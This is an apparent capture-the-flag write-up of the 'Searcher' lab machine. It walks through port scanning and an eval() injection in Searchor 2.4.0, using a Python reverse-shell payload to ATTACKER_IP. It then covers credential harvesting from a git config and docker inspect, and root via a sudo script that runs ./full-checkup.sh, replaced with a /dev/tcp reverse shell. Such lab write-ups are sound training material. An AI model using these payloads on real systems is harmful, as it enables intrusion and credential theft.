 Initial Enumeration

I kicked things off with a full TCP port scan:

nmap -p- 10.10.11.208

Open ports:

    22/tcp → SSH

    80/tcp → HTTP

Browsing to port 80 showed a domain mismatch, so I mapped the hostname found in the browser to /etc/hosts:

echo "10.10.11.208 searcher.htb" >> /etc/hosts

🔍 Web Enumeration

The website was running Flask and using Searchor v2.4.0. A quick search revealed that version is vulnerable due to a dangerous use of eval():

url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")

This was patched in later versions. I found a working PoC here:
🔗 https://github.com/nexis-nexis/Searchor-2.4.0-POC-Exploit-

Payload used:

', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#

Replaced ATTACKER_IP and PORT with my own VPN details.
🐚 Initial Shell Access

Listener:

python3 -m pwncat
connect -lp 4444

Sent the payload through the search form… and BOOM — we landed a shell as svc.
User flag acquired ✅
🚀 Privilege Escalation - Part 1

I uploaded and executed linpeas:

upload /home/kali/Pentest/linpeas.sh /tmp/linpeas.sh
cd /tmp
bash linpeas.sh

Found a .git folder in /var/www/app/ with hardcoded credentials in config:

[remote "origin"]
url = http://cody:[REDACTED]@gitea.searcher.htb/cody/Searcher_site.git

These credentials were valid for the Gitea web interface, and revealed that cody (aka svc) is a user on the Git service.
Login successful ✅
⚙️ Privilege Escalation - Part 2

Used the Gitea password to check for sudo privileges:

sudo -l

Result:

(svc) may run as root:
/usr/bin/python3 /opt/scripts/system-checkup.py *

That script accepted 3 arguments:

    docker-ps

    docker-inspect

    full-checkup

🐳 Docker Recon

I ran:

sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps

Output:

gitea/gitea:latest (ID: 960873171e2e)
mysql:8 (ID: f84a6b33fb5a)

Then inspected the Gitea container:

sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect --format='{{json .Config}}' 960873171e2e

Output revealed environment variables with credentials:

"GITEA__database__USER=gitea",
"GITEA__database__PASSWD=[REDACTED]"

Tried logging into Gitea with several usernames — administrator + password worked. Now we had access to administrator's repos, including the source for system-checkup.py.
💣 Exploiting Full-Checkup

The script had this logic:

elif action == 'full-checkup':
    try:
        arg_list = ['./full-checkup.sh']

It tries to run ./full-checkup.sh from the current directory.

So I moved to /tmp (world-writable), and created a reverse shell script:

cd /tmp
echo "#!/bin/bash" > full-checkup.sh
echo "/bin/bash -i >& /dev/tcp/10.10.14.156/6666 0>&1" >> full-checkup.sh
chmod +x full-checkup.sh

Started listener:

python3 -m pwncat
connect -lp 6666

Triggered the script:

sudo -u root /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

🏁 Root Access

Shell popped as root — mission accomplished.
Root flag captured ✅
